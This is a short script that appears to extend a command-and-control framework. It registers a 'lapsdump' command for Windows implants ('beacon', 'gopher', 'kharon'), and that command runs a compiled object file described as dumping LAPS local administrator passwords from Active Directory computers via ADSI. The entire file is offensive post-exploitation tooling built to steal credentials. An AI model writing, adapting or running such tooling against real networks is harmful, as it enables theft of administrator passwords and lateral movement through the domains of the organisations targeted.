var metadata = {
    name: "Lapsdump",
    description: "Dump LAPS passwords from AD computers via ADSI"
};

var cmd_lapsdump = ax.create_command("lapsdump", "Dump LAPS passwords from specified computers within Active Directory", "lapsdump <target>");
cmd_lapsdump.addArgString("target", true, "IP address or hostname of the target AD computer");
cmd_lapsdump.setPreHook(function (id, cmdline, parsed_json) {
    var target     = parsed_json["target"];
    var bof_params = ax.bof_pack("wstr", [target]);
    var bof_path   = ax.script_dir() + "Lapsdump." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, `Task: dump LAPS password for ${target}`);
});

var group_lapsdump = ax.create_commands_group("Lapsdump-BOF", [cmd_lapsdump]);
ax.register_commands_group(group_lapsdump, ["beacon", "gopher", "kharon"], ["windows"], []);
